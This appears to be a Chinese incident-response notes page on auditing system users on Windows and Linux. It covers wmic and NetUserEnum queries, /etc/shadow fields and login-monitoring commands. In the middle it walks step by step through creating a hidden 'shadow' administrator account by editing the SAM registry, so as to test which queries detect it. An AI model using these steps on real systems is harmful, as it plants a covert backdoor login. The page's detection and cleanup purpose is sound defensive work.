DESKTOP-D9ITQNU\\RESTRICTED DESKTOP-D9ITQNU TRUE RESTRICTED S-1-5-12 5 OK DESKTOP-D9ITQNU\\TERMINAL SERVER USER DESKTOP-D9ITQNU\\TERMINAL SERVER USER DESKTOP-D9ITQNU TRUE TERMINAL SERVER USER S-1-5-13 5 OK DESKTOP-D9ITQNU\\REMOTE INTERACTIVE LOGON DESKTOP-D9ITQNU\\REMOTE INTERACTIVE LOGON DESKTOP-D9ITQNU TRUE REMOTE INTERACTIVE LOGON S-1-5-14 5 OK DESKTOP-D9ITQNU\\IUSR DESKTOP-D9ITQNU\\IUSR DESKTOP-D9ITQNU TRUE IUSR S-1-5-17 5 OK DESKTOP-D9ITQNU\\LOCAL SERVICE DESKTOP-D9ITQNU\\LOCAL SERVICE DESKTOP-D9ITQNU TRUE LOCAL SERVICE S-1-5-19 5 OK DESKTOP-D9ITQNU\\NETWORK SERVICE DESKTOP-D9ITQNU\\NETWORK SERVICE DESKTOP-D9ITQNU TRUE NETWORK SERVICE S-1-5-20 5 OK DESKTOP-D9ITQNU\\BUILTIN DESKTOP-D9ITQNU\\BUILTIN DESKTOP-D9ITQNU TRUE BUILTIN S-1-5-32 3 OK C: \\Users\\xt\u003ewmic GROUP Caption Description Domain InstallDate LocalAccount Name SID SIDType Status DESKTOP-D9ITQNU\\Access Control Assistance Operators 此组的成员可以远程查询此计算机上资源的授权属性和权限。 DESKTOP-D9ITQNU TRUE Access Control Assistance Operators S-1-5-32-579 4 OK DESKTOP-D9ITQNU\\Administrators 管理员对计算机/域有不受限制的完全访问权 DESKTOP-D9ITQNU TRUE Administrators S-1-5-32-544 4 OK DESKTOP-D9ITQNU\\Backup Operators 备份操作员为了备份或还原文件可以替代安全限制 DESKTOP-D9ITQNU TRUE Backup Operators S-1-5-32-551 4 OK DESKTOP-D9ITQNU\\Cryptographic Operators 授权成员执行加密操作。 DESKTOP-D9ITQNU TRUE Cryptographic Operators S-1-5-32-569 4 OK DESKTOP-D9ITQNU\\Device Owners 此组的成员可以更改系统范围内的设置。 DESKTOP-D9ITQNU TRUE Device Owners S-1-5-32-583 4 OK DESKTOP-D9ITQNU\\Distributed COM Users 成员允许启动、激活和使用此计算机上的分布式 COM 对象。 DESKTOP-D9ITQNU TRUE Distributed COM Users S-1-5-32-562 4 OK DESKTOP-D9ITQNU\\Event Log Readers 此组的成员可以从本地计算机中读取事件日志 DESKTOP-D9ITQNU TRUE Event Log Readers S-1-5-32-573 4 OK DESKTOP-D9ITQNU\\Guests 按默认值，来宾跟用户组的成员有同等访问权，但来宾帐户的限制更多 DESKTOP-D9ITQNU TRUE Guests S-1-5-32-546 4 OK DESKTOP-D9ITQNU\\Hyper-V Administrators 此组的成员拥有对 Hyper-V 所有功能的完全且不受限制的访问权限。 DESKTOP-D9ITQNU TRUE Hyper-V Administrators S-1-5-32-578 4 OK DESKTOP-D9ITQNU\\IIS_IUSRS Internet 信息服务使用的内置组。 DESKTOP-D9ITQNU TRUE IIS_IUSRS S-1-5-32-568 4 OK DESKTOP-D9ITQNU\\Network Configuration Operators 此组中的成员有部分管理权限来管理网络功能的配置 DESKTOP-D9ITQNU TRUE Network Configuration Operators S-1-5-32-556 4 OK DESKTOP-D9ITQNU\\Performance Log Users 该组中的成员可以计划进行性能计数器日志记录、启用跟踪记录提供程序，以及在本地或通过远程访问此计算机来收集事件跟踪记录 DESKTOP-D9ITQNU TRUE Performance Log Users S-1-5-32-559 4 OK DESKTOP-D9ITQNU\\Performance Monitor Users 此组的成员可以从本地和远程访问性能计数器数据 DESKTOP-D9ITQNU TRUE Performance Monitor Users S-1-5-32-558 4 OK DESKTOP-D9ITQNU\\Power Users 包括高级用户以向下兼容，高级用户拥有有限的管理权限 DESKTOP-D9ITQNU TRUE Power Users S-1-5-32-547 4 OK DESKTOP-D9ITQNU\\Remote Desktop Users 此组中的成员被授予远程登录的权限 DESKTOP-D9ITQNU TRUE Remote Desktop Users S-1-5-32-555 4 OK DESKTOP-D9ITQNU\\Remote Management Users 此组的成员可以通过管理协议(例如，通过 Windows 远程管理服务实现的 WS-Management)访问 WMI 资源。这仅适用于授予用户访问权限的 WMI 命名空间。 DESKTOP-D9ITQNU TRUE Remote Management Users S-1-5-32-580 4 OK DESKTOP-D9ITQNU\\Replicator 支持域中的文件复制 DESKTOP-D9ITQNU TRUE Replicator S-1-5-32-552 4 OK DESKTOP-D9ITQNU\\System Managed Accounts Group 此组的成员由系统管理。 DESKTOP-D9ITQNU TRUE System Managed Accounts Group S-1-5-32-581 4 OK DESKTOP-D9ITQNU\\Users 防止用户进行有意或无意的系统范围的更改，但是可以运行大部分应用程序 DESKTOP-D9ITQNU TRUE Users S-1-5-32-545 4 OK C: \\Users\\xt\u003ewmic NETLOGIN AccountExpires AuthorizationFlags BadPasswordCount Caption CodePage Comment CountryCode Description Flags FullName HomeDirectory HomeDirectoryDrive LastLogoff LastLogon LogonHours LogonServer MaximumStorage Name NumberOfLogons Parameters PasswordAge PasswordExpires PrimaryGroupId Privileges Profile ScriptPath SettingID UnitsPerWeek UserComment UserId UserType Workstations NT AUTHORITY\\SYSTEM Network login profile settings for SYSTEM on NT AUTHORITY NT AUTHORITY\\SYSTEM NT AUTHORITY\\LOCAL SERVICE Network login profile settings for LOCAL SERVICE on NT AUTHORITY NT AUTHORITY\\LOCAL SERVICE NT AUTHORITY\\NETWORK SERVICE Network login profile settings for NETWORK SERVICE on NT AUTHORITY NT AUTHORITY\\NETWORK SERVICE 0 0 xt 936 86 Network login profile settings for on DESKTOP-D9ITQNU 545 **************.******+*** 20210425165804.000000+480 Sunday: No Limit -- Monday: No Limit -- Tuesday: No Limit -- Wednesday: No Limit -- Thursday: No Limit -- Friday: No Limit -- Saturday: No Limit \\\\* 4294967295 DESKTOP-D9ITQNU\\xt 35 00000324025454.000000: 000 513 2 168 1000 Normal Account C: \\Users\\xt\u003ewmic VOLUMEUSERQUOTA Account DiskSpaceUsed Limit Status Volume WarningLimit Win32_Account.Domain=\"DESKTOP-D9ITQNU\",Name=\"Administrators\" 0 18446744073709551615 0 Win32_Volume.DeviceID=\"\\\\?\\Volume{04c048df-758d-4776-9cd8-84ab287e5ec5}\\\" 18446744073709551615 Win32_Account.Domain=\"DESKTOP-D9ITQNU\",Name=\"Administrators\" 0 18446744073709551615 0 Win32_Volume.DeviceID=\"\\\\?\\Volume{5ee0bcd2-e04a-4324-afc6-29f338e1551e}\\\" 18446744073709551615渗透常用查询语句 后渗透中常用一句话查询\nwmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles/format: list 获取系统角色、用户名和制造商 wmic group get Caption, InstallDate, LocalAccount, Domain, SID, Status 账户名、域名、本地组成员状态、SID以及相应的状态 C: \\Users\\xt\u003ewmic group get Caption, InstallDate, LocalAccount, Domain, SID, Status Caption Domain InstallDate LocalAccount SID Status DESKTOP-D9ITQNU\\Access Control Assistance Operators DESKTOP-D9ITQNU TRUE S-1-5-32-579 OK DESKTOP-D9ITQNU\\Administrators DESKTOP-D9ITQNU TRUE S-1-5-32-544 OK DESKTOP-D9ITQNU\\Backup Operators DESKTOP-D9ITQNU TRUE S-1-5-32-551 OK DESKTOP-D9ITQNU\\Cryptographic Operators DESKTOP-D9ITQNU TRUE S-1-5-32-569 OK DESKTOP-D9ITQNU\\Device Owners DESKTOP-D9ITQNU TRUE S-1-5-32-583 OK DESKTOP-D9ITQNU\\Distributed COM Users DESKTOP-D9ITQNU TRUE S-1-5-32-562 OK DESKTOP-D9ITQNU\\Event Log Readers DESKTOP-D9ITQNU TRUE S-1-5-32-573 OK DESKTOP-D9ITQNU\\Guests DESKTOP-D9ITQNU TRUE S-1-5-32-546 OK DESKTOP-D9ITQNU\\Hyper-V Administrators DESKTOP-D9ITQNU TRUE S-1-5-32-578 OK DESKTOP-D9ITQNU\\IIS_IUSRS DESKTOP-D9ITQNU TRUE S-1-5-32-568 OK DESKTOP-D9ITQNU\\Network Configuration Operators DESKTOP-D9ITQNU TRUE S-1-5-32-556 OK DESKTOP-D9ITQNU\\Performance Log Users DESKTOP-D9ITQNU TRUE S-1-5-32-559 OK DESKTOP-D9ITQNU\\Performance Monitor Users DESKTOP-D9ITQNU TRUE S-1-5-32-558 OK DESKTOP-D9ITQNU\\Power Users DESKTOP-D9ITQNU TRUE S-1-5-32-547 OK DESKTOP-D9ITQNU\\Remote Desktop Users DESKTOP-D9ITQNU TRUE S-1-5-32-555 OK DESKTOP-D9ITQNU\\Remote Management Users DESKTOP-D9ITQNU TRUE S-1-5-32-580 OK DESKTOP-D9ITQNU\\Replicator DESKTOP-D9ITQNU TRUE S-1-5-32-552 OK DESKTOP-D9ITQNU\\System Managed Accounts Group DESKTOP-D9ITQNU TRUE S-1-5-32-581 OK DESKTOP-D9ITQNU\\Users DESKTOP-D9ITQNU TRUE S-1-5-32-545 OK注册表（可审影子账户） 点击“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\\SAM\\SAM\n这里为了搜索注册表中所有关于我们影子账户的信息，还可以通过这个软件regscanner\nhttps://www.nirsoft.net/utils/regscanner.html\n借助工具我们可以针对影子账户关键字，反查所有注册表中的关键字、键值中的值中是否包含影子账户关键字Administrat0r$，这里我门看到一共查处了8项包含有该关键字的注册表这里一次分析总结\n计算机文件操作记录 计算机\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU\\reg 文件操作记录中包含有关键字，可以看到.reg，大致可以判断是我们之前保存在桌面上的导出的注册表命名的。通过文件操作记录查看工具针对此注册表可以清晰的看出，这里的确展示的是保存在桌面的注册表导出文件。一共四项与上面4项对应。\n工具可以在这里下载：https://www.nirsoft.net/utils/open_save_files_view.html\n桌面缓存 计算机\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\Shell\\Bags\\1\\Desktop桌面所有图标名称等情况，这里也包含的是reg导出文件包含的影子关键字\nNetUserEnum win32API函数（可审影子账户） 这里还是通过官方理解函数，地址如下：https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuserenum\nNetUserEnum功能检索服务器上所有用户帐户的信息。这里可以用于检查系统账户信息。\nNET_API_STATUS NET_API_FUNCTION NetUserEnum( LPCWSTR servername, DWORD level, DWORD filter, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, PDWORD resume_handle );参数详解 ** servername**\n一个指向常量字符串的指针，该字符串指定要执行该函数的远程服务器的DNS或NetBIOS名称。如果该参数为NULL，表示使用本地计算机。\n** level**\n指定数据的信息级别。此参数可以是以下值之一。\nPARAMETERS\nValue Meaning 0 返回用户帐号名称。bufptr参数指向USER_INFO_0结构的数组。 1 返回有关用户帐户的详细信息。bufptr参数指向USER_INFO_1结构的数组。 2 返回有关用户帐户的详细信息，包括授权级别和登录信息。bufptr参数指向USER_INFO_2结构的数组。 3 返回有关用户帐户的详细信息，包括授权级别、登录信息、用户和主组的rid以及配置文件信息。bufptr参数指向USER_INFO_3结构的数组。 10 返回用户名和帐户名以及评论。bufptr参数指向USER_INFO_10结构的数组。 11 返回有关用户帐户的详细信息。bufptr参数指向USER_INFO_11结构的数组。 20 返回用户名和标识符以及各种帐户属性。bufptr参数指向USER_INFO_20结构的数组。注意，在Windows XP和更高版本上，建议您使用USER_INFO_23代替。 filter\n指定要包含在枚举中的用户帐户类型的值。值为0表示应该包括所有正常的用户、信任数据和机器帐户数据。\n此参数也可以是以下值的组合。\nValue Meaning FILTER_TEMP_DUPLICATE_ACCOUNT 枚举主帐户位于另一个域中的用户的帐户数据。此帐户类型提供对此域的用户访问，但不提供对信任此域的任何域的访问。用户管理器将此帐户类型称为本地用户帐户。 FILTER_NORMAL_ACCOUNT 枚举普通用户帐户数据。此帐户类型与一个典型的用户相关联。 FILTER_INTERDOMAIN_TRUST_ACCOUNT 枚举域间信任帐户数据。此帐户类型与信任其他域的域的信任帐户相关联。 FILTER_WORKSTATION_TRUST_ACCOUNT 枚举工作站或成员服务器信任帐户数据。此帐户类型与域成员计算机的计算机帐户相关联。 FILTER_SERVER_TRUST_ACCOUNT 枚举成员服务器计算机帐户数据。此帐户类型与属于该域成员的备份域控制器的计算机帐户相关联。 bufptr\n一个指向接收数据的缓冲区的指针。该数据的格式取决于level参数的值。\n该数据的缓冲区由系统分配，应用程序必须调用NetApiBufferFree函数来释放已分配的内存，当返回的数据不再需要时。注意，即使NetUserEnum函数以ERROR_MORE_DATA失败，也必须释放缓冲区。\nprefmaxlen\n返回数据的首选最大长度(以字节为单位)。如果指定了MAX_PREFERRED_LENGTH, NetUserEnum函数将为数据分配所需的内存。如果在此参数中指定另一个值，则可以限制函数返回的字节数。如果缓冲区大小不足以容纳所有表项，则函数返回ERROR_MORE_DATA。有关更多信息，请参见网络管理功能缓冲区和网络管理功能缓冲区长度。\nentriesread\n一个指向值的指针，该值接收实际枚举的元素计数。\ntotalentries\n一个指向一个值的指针，该值接收可以从当前恢复位置枚举的条目总数。请注意，应用程序应该只将此值视为一种提示。如果您的应用程序正在与Windows 2000或更高版本的域控制器通信，您应该考虑使用ADSI LDAP Provider更有效地检索这种类型的数据。ADSI LDAP Provider实现了一组支持各种ADSI接口的ADSI对象。有关更多信息，请参见ADSI服务提供商。\nLAN管理器: 如果呼叫是对一台正在运行LAN管理器2的计算机。， totalentries参数将始终反映数据库中条目的总数，而不管条目在恢复序列中的位置。\nresume_handle\n一个指向包含简历句柄的值的指针，该句柄用于继续现有的用户搜索。句柄在第一次调用时应该为零，在后续调用时保持不变。如果此参数为NULL，则不存储resume句柄。\n返回值详解 如果函数成功，返回值为NERR_Success。\n如果函数失败，返回值可以是以下错误码之一。\n返回代码 描述 ERROR_ACCESS_DENIED 用户无法访问所请求的信息。 ERROR_INVALID_LEVEL 系统调用级别不正确。如果level参数设置为不支持的值，则返回此错误。 NERR_BufTooSmall 缓冲区太小，不能包含一个条目。没有任何信息被写入缓冲区。 NERR_InvalidComputer 计算机名无效。 ERROR_MORE_DATA 更多的条目是可用的。指定一个足够大的缓冲区来接收所有条目。 NetUserEnum功能检索关于指定远程服务器或本地计算机上的所有用户帐户的信息。\nNetQueryDisplayInformation功能可用于快速枚举用户、计算机或全局组帐户信息，以便在用户界面中显示。\n如果您正在为Active Directory编程，您可能能够调用某些Active Directory服务接口(ADSI)方法来实现与调用网络管理用户函数相同的功能。有关更多信息，请参见IADsUser和IADsComputer。\n如果在运行Active Directory的域控制器上调用NetUserEnum函数，将根据安全对象的ACL (access control list)允许或拒绝访问。默认ACL允许所有经过认证的用户和“windows 2000兼容前访问”组的成员查看这些信息。如果在成员服务器或工作站上调用此函数，则所有经过身份验证的用户都可以查看该信息。有关匿名访问和在这些平台上限制匿名访问的信息，请参见网络管理功能的安全要求。有关acl、ACEs和访问令牌的更多信息，请参见访问控制模型。\nNetUserEnum函数只返回调用者具有Read访问权限的信息。调用者必须具有对域对象的列表内容访问权，并枚举位于系统容器中的SAM服务器对象的整个SAM域访问权。\n可以使用LsaEnumerateTrustedDomains或LsaEnumerateTrustedDomainsEx函数来检索被LSA (Local Security Authority)策略对象信任的域的名称和sid。\nNetUserEnum函数不返回所有系统用户。它只返回那些通过调用NetUserAdd函数添加的用户。不能保证用户列表将按顺序返回。\n如果调用NetUserEnum函数并为level参数指定信息级别1、2或3，则检索到的每个结构的密码成员都设置为NULL，以保证密码安全。\n用户名长度限制为20个字符，用户组名长度限制为256个字符。另外，帐户名不能以句点结尾，不能包含逗号或以下可打印字符: “，/，，[，]，: ，|，\u003c，\u003e，+，=，;，?，*。名称也不能包括1-31范围内的字符，这是不可打印的。\nNetUserEnum函数不支持级别为4的参数，也不支持USER_INFO_4结构。NetUserGetInfo函数支持4级参数和USER_INFO_4结构。\n使用netuserenum编译程序 这里可以参考yangsir的工具也可以用官方的用例自己调整。\nhttps://www.cnblogs.com/Yang34/p/14242026.html\n各命令行语句的能力对比 为了对影子账户的检出能力对比研究，这里需要首先需要创建隐藏账号/影子账号。之后我们用之前的各个命令尝试查询影子账号，并对影子账号结果进行跟踪\n创建影子账户 环境：首先确定administrator已经配置了密码，如果没有可以在计算机管理中找到本地用户和组，用户，如下修改密码。如果后面需要远程登陆或者登陆桌面的话需要保证需要复制的账户的已经配置了密码，这里是计划复制administrator账户权限的。\n首先，新建个影子账户\nC: \\Users\\xt\u003enet user Administrat0r 123 /add 命令成功完成。 regedit进入注册表\n计算机\\HKEY_LOCAL_MACHINE\\SAM\\SAM\n给予sam权限\n显示如下\n刷新F5，展开找到administrator账户的键值0x1f4\n打开0x1f4中F对应的十六进制值，复制并替换掉，我们新建的Administrat0r账户对应的F数值数据\n导出0x3E9对应的注册表为reg格式文档，然后在计算机管理中删除Administrat0r账户\n此时注册表已没有相关注册信息\n这时使用导出的reg导入\nadministra…\n注册表编辑器\nCusersxtDesktopladministratoreg中包含的项和值已成功添加到注册表中\n确定\n登陆测试成功，影子账户添加成功。\n此时还无法直接登陆，因为无法自定义输入用户名，这里需要修改本地策略\n进入经典登录模式的设置方法：\nwin+R——secpol.msc 本地策略——安全选项 交互式登录——不显示上次的用户名——已启用 交互式登录——不需要按下Ctrl+Alt+Del——已禁用 重启登录——Ctrl+Alt+Del 实验步骤总结:\nadministrator添加密码，新增administrat0r用户 复制xt（管理员权限）的F值到administrat0r的对应F值中，导出administrat0r对应Names中账户注册表以及Users中对应的对应注册表，只导出一个注册表最终会导致无法正常登陆 删除administrat0r账户 导入保存的2个注册表 尝试使用administrat0r用户名远程登陆登陆，成功登陆xt账户中 查询影子账户查询能力测试 C: \\Users\\xt\u003enet user \\\\DESKTOP-D9ITQNU 的用户帐户 ------------------------------------------------------------------------------- Administrator DefaultAccount Guest test WDAGUtilityAccount xt 命令成功完成。 C: \\Users\\xt\u003enet localgroup administrators 别名 administrators 注释 管理员对计算机/域有不受限制的完全访问权 成员 ------------------------------------------------------------------------------- Administrator xt 命令成功完成。 C: \\Users\\xt\u003eC: \\Users\\xt\\Downloads\\1.exe User account on (null): -- Administrat0r$ -- Administrator -- DefaultAccount -- Guest -- test -- WDAGUtilityAccount -- xt Total of 7 entries enumerated C: \\Users\\xt\u003ewmic useraccount get name Name Administrat0r$ Administrator DefaultAccount Guest test WDAGUtilityAccount xt 查询方法 结果 net user Net localgroup wmic useraccount 可查影子账号 注册表 可查影子账号 NetUserEnum函数（编译的程序查询） 可查影子账号 清理影子账户 删除计算机\\HKEY_LOCAL_MACHINE\\SAM\\SAM中对应影子账号的键值即可。\nlinux查看系统用户 linux因为目前未出现隐藏账号的手段，目前审计用户只需要针对两个文件下的账户做审计即可。\n用户信息文件/etc/passwd root: x: 0: 0: root: /root: /bin/bash\naccount: password: UID: GID: GECOS: directory: shell\n用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell\n注意：无密码只允许本机登陆，远程不允许登陆\n影子文件/etc/shadow root: $6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/: 16809: 0: 99999: 7: : :\n用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留\n用户名 用户名称\n加密密码 如果格式为”$id$salt$hashed\"，则表示该用户密码正常。这里保存的是真正加密的密码。\n目前 Linux 的密码采用的是 SHA512 散列加密算法，原来采用的是 MD5 或 DES 加密算法。SHA512 散列加密算法的加密等级更高，也更加安全。\n留空 开头的表示用户没有密码 ! 表明用户被锁，被锁账户无法登陆，但可能使用其他方式登陆如私钥认证ssh或su * 表明用户被锁， !! 表明用户从来没设置过密码 $6$开头的，表明是用SHA-512加密的， $1$ 表明是用MD5加密的 $2$ 是用Blowfish加密的 $5$ 是用 SHA-256加密的。注意，这串密码产生的乱码不能手工修改，如果手工修改，系统将无法识别密码，导致密码失效。很多软件透过这个功能，在密码串前加上 “!\"、”*\" 或 “x” 使密码暂时失效。\n所有伪用户的密码都是 “!!” 或 “*\"，代表没有密码是不能登录的。当然，新创建的用户如果不设定密码，那么它的密码项也是 “!!\"，代表这个用户没有密码，不能登录。\n最后一次修改时间 最后一次修改密码的时间“16809”的理解。\n这是因为，Linux 计算日期的时间是以 1970 年 1 月 1 日作为 1 不断累加得到的时间，到 1971 年 1 月 1 日，则为 366 天。这里显示 16809天，也就是说，此 root 账号在 1970 年 1 月 1 日之后的第 16809 天修改的 root 用户密码。\n可以使用如下命令进行换算：\n┌──(x7㉿x7)-[~] └─$ date -d \"1970-01-01 16809 day\" 2016年 01月 09日 星期六 00: 00: 00 CST最小修改时间间隔 最小修改间隔时间，也就是说，该字段规定了从第 3 字段（最后一次修改密码的日期）起，多长时间之内不能修改密码。如果是 0，则密码可以随时修改；如果是 10，则代表密码修改后 10 天之内不能再次修改密码。\n密码有效期 经常变更密码是个好习惯，为了强制要求用户变更密码，这个字段可以指定距离第 3 字段（最后一次更改密码）多长时间内需要再次变更密码，否则该账户密码进行过期阶段。\n该字段的默认值为 99999，也就是 273 年，可认为是永久生效。如果改为 90，则表示密码被修改 90 天之后必须再次修改，否则该用户即将过期。管理服务器时，通过这个字段强制用户定期修改密码。\n密码需要变更前的警告天数 与第 5 字段相比较，当账户密码有效期快到时，系统会发出警告信息给此账户，提醒用户 “再过 n 天你的密码就要过期了，请尽快重新设置你的密码！\"。\n该字段的默认值是 7，也就是说，距离密码有效期的第 7 天开始，每次登录系统都会向该账户发出 “修改密码” 的警告信息。\n密码过期后的宽限天数 也称为“口令失效日”，简单理解就是，在密码过期后，用户如果还是没有修改密码，则在此字段规定的宽限天数内，用户还是可以登录系统的；如果过了宽限天数，系统将不再让此账户登陆，也不会提示账户过期，是完全禁用。\n比如说，此字段规定的宽限天数是 10，则代表密码过期 10 天后失效；如果是 0，则代表密码过期后立即失效；如果是 -1，则代表密码永远不会失效。\n账号失效时间 同第 3 个字段一样，使用自 1970 年 1 月 1 日以来的总天数作为账户的失效时间。该字段表示，账号在此字段规定的时间之外，不论你的密码是否过期，都将无法使用！\n该字段通常被使用在具有收费服务的系统中。\nwho who 查看当前登录用户（tty本地登陆 pts远程登录）who命令能够打印 当前都有谁****登录到系统中 的相关信息 。who命令只会显示真正登录到系统中的用户。它不会显示那些通过su命令切换用户的登录者，也就是说who不会枚举出所有用户，只是列出正在登陆的用户相关信息。\nroot@cheerful-push-1: ~# who root pts/0 2021-05-17 03: 54 (ip地址) root pts/1 2021-05-17 03: 54 (ip地址) 第一列显示用户名 第二列显示用户连接方式。tty代表用户直接连接到服务器，pts代表远程登录。 第三、四列分别显示日期和时间 第五列显示用户登录IP地址。 -a , –all 与使用选项-b -d –login -p -r -t -T -u相同。 -b , –boot 显示上次系统引导的时间。 -d , –dead 显示死进程。 -H , –heading 打印一行列标题。 –ips 打印IP地址而不是主机名。 使用–lookup，基于存储的IP（如果可用）进行规范化，而不是存储的主机名。 -l , –login 打印系统登录过程。 –lookup 尝试通过DNS规范化主机名。 -m 仅打印有关与标准输入（发出命令的终端）关联的用户和主机的信息。 此方法符合POSIX标准。 -p , –process 打印由init生成的活动进程。 -q , –count 显示所有当前登陆的登录名，以及所有当前正在登陆的用户数计数。注意：这里不应理解为列出所有登陆过的用户数，而是此命令只能显示正在登陆的用户。 -r , –runlevel 打印当前运行级别。 -s , –short 仅打印名称，行和时间字段，这是默认值。 -t , –time 如果信息可用，则打印上次更改系统时钟的时间。 -T , -w , –mesg 添加一个字符，该字符指示终端的状态: “+”如果终端是可写的，“-”如果终端不是可写的，或“?” -u , –users 打印每个用户的空闲时间和进程ID。 –message 与-T相同。 –writable 与-T相同。 –help 显示帮助消息，然后退出。 –version 显示版本信息，然后退出。 w **w命令用于显示已经登陆系统的用户列表，并显示用户正在执行的指令。执行这个命令可得知目前登入系统的用户有那些人，以及他们正在执行的程序。单独执行w命令会显示所有的用户，您也可指定用户名称，仅显示某位用户的相关信息。**下面让我们详细讲解一下w命令的使用方法。\nw(选项)(参数) -f 开启或关闭显示用户从何处登入系统。 -h 不显示各栏位的标题信息列。 -l 使用详细格式列表，此为预设值。 -s 使用简洁格式列表，不显示用户登入时间，终端机阶段作业和程序所耗费的CPU时间。 -u 忽略执行程序的名称，以及该程序耗费CPU时间的信息。 -V 显示版本信息。uptime 系统中的uptime命令主要用于获取主机运行时间和查询linux系统负载等信息。uptime命令可以显示系统已经运行了多长时间，信息显示依次为：现在时间、系统已经运行了多长时间、目前有多少登陆用户、系统在过去的1分钟、5分钟和15分钟内的平均负载。\nuptime 查看登陆多久、多少用户，负载 10: 19: 04 //系统当前时间 up 257 days, 18: 56 //主机已运行时间，时间越大，说明你的机器越稳定。 12 user //用户连接数，是总连接数而不是用户数 load average // 系统平均负载，统计最近1，5，15分钟的系统平均负载那么什么是系统平均负载呢？ 系统平均负载是指在特定时间间隔内运行队列中的平均进程数。入侵排查： 1、查询特权用户特权用户(uid 为0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd 2、查询可以远程登录的帐号信息 [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow 3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限 [root@localhost ~]# more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\"清理/限制账户： 禁用或删除多余及可疑的帐号 usermod -L user 禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头 userdel user 删除user用户 userdel -r user 将删除user用户，并且将/home目录下的user目录一并删除本文参考 https://blog.csdn.net/discover2210212455/article/details/82711930\nhttps://bypass007.github.io/Emergency-Response-Notes/ 应急响应实战笔记\nhttp://c.biancheng.net/view/840.html\nhttps://linux.cn/article-2437-1.html\nhttps://www.runoob.com/linux/linux-comm-w.html\n",
    "description": "",
    "tags": null,
    "title": "系统用户审查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/index.html"
  },
  {
    "content": "linux下系统进程查询 ps https://www.runoob.com/linux/linux-comm-ps.html\nUsage: ps [options] 参数： ps 的参数非常多, 在此仅列出几个常用的参数并大略介绍含义 -A 列出所有的进程 -w 显示加宽可以显示较多的资讯 -au 显示较详细的资讯 -aux 显示所有包含其他使用者的行程 au(x) 输出格式 : USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND USER: 行程拥有者 PID: pid %CPU: 占用的 CPU 使用率 %MEM: 占用的记忆体使用率 VSZ: 占用的虚拟记忆体大小 RSS: 占用的记忆体大小 TTY: 终端的次要装置号码 (minor device number of tty) STAT: 该行程的状态: D: 无法中断的休眠状态 (通常 IO 的进程) R: 正在执行中 S: 静止状态 T: 暂停执行 Z: 不存在但暂时无法消除 W: 没有足够的记忆体分页可分配 \u003c: 高优先序的行程 N: 低优先序的行程 L: 有记忆体分页分配并锁在记忆体内 (实时系统或捱A I/O) START: 行程开始时间 TIME: 执行的时间 COMMAND:所执行的指令使用ps命令，分析进程\nps aux | grep pid常用查询语句 ps -ef //显示所有命令，连带命令行 根据netstat定位出的pid.使用ps命令分析进程 ps aux | grep pid 查看下pid所对应的进程文件路径， netstat -antlp 运行ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为对应的pid 号） ps -u root //显示root进程用户信息 ps -A parallels@parallels-Parallels-Virtual-Platform:~$ ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 14:03 ? 00:00:02 /sbin/init splash root 2 0 0 14:03 ? 00:00:00 [kthreadd] root 3 2 0 14:03 ? 00:00:00 [rcu_gp] root 4 2 0 14:03 ? 00:00:00 [rcu_par_gp] root 6 2 0 14:03 ? 00:00:00 [kworker/0:0H-kblockd] root 9 2 0 14:03 ? 00:00:00 [mm_percpu_wq] root 10 2 0 14:03 ? 00:00:00 [ksoftirqd/0] root 11 2 0 14:03 ? 00:00:08 [rcu_sched] root 12 2 0 14:03 ? 00:00:00 [migration/0] root 13 2 0 14:03 ? 00:00:00 [idle_inject/0] root 14 2 0 14:03 ? 00:00:00 [cpuhp/0] root 15 2 0 14:03 ? 00:00:00 [cpuhp/1] root 16 2 0 14:03 ? 00:00:00 [idle_inject/1] root 17 2 0 14:03 ? 00:00:00 [migration/1] root 18 2 0 14:03 ? 00:00:00 [ksoftirqd/1] root 20 2 0 14:03 ? 00:00:00 [kworker/1:0H-kblockd] root 21 2 0 14:03 ? 00:00:00 [kdevtmpfs] root 22 2 0 14:03 ? 00:00:00 [netns] root 23 2 0 14:03 ? 00:00:00 [rcu_tasks_kthre] root 24 2 0 14:03 ? 00:00:00 [kauditd] root 28 2 0 14:03 ? 00:00:00 [khungtaskd] root 29 2 0 14:03 ? 00:00:00 [oom_reaper] root 30 2 0 14:03 ? 00:00:00 [writeback] root 31 2 0 14:03 ? 00:00:00 [kcompactd0] root 32 2 0 14:03 ? 00:00:00 [ksmd] root 33 2 0 14:03 ? 00:00:00 [khugepaged] root 125 2 0 14:03 ? 00:00:00 [kintegrityd] root 126 2 0 14:03 ? 00:00:00 [kblockd] root 127 2 0 14:03 ? 00:00:00 [blkcg_punt_bio] root 128 2 0 14:03 ? 00:00:00 [tpm_dev_wq] root 129 2 0 14:03 ? 00:00:00 [ata_sff] root 130 